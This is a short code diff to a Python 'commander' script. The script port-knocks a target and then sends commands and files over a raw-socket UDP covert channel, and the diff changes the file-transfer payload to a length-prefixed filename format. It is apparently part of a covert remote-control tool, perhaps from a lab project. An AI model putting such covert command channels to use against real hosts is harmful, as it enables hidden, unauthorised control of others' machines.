@@ -6,7 +6,7 @@ Performs TCP port knock, then sends commands via UDP raw socket covert channel.
 REQUIRES: Root/Administrator privileges for raw sockets
 Usage: sudo python3 commander.py <target_host>
 """
-
+import os
 import socket
 import struct
 import time
@@ -372,9 +372,14 @@ class Commander:
                         try:
                             with open(args, 'rb') as f:
                                 filedata = f.read()
-                            filename = args.split('/')[-1]  # Get filename
-                            # Format: filename|filedata
-                            payload = f"{filename}|".encode('utf-8') + filedata
+                            filename = os.path.basename(args)
+                            filename_bytes = filename.encode('utf-8')
+
+                            # Create payload: filename_length (2 bytes) | filename | filedata
+                            filename_length = len(filename_bytes)
+                            payload = struct.pack('!H', filename_length) + filename_bytes + filedata
+
+                            print(f"[*] Transferring file: {filename} ({len(filedata)} bytes)")
                             self.send_covert_command(CommandType.TRANSFER_TO_CLIENT, payload)
                         except Exception as e:
                             print(f"[!] Error reading file: {e}")
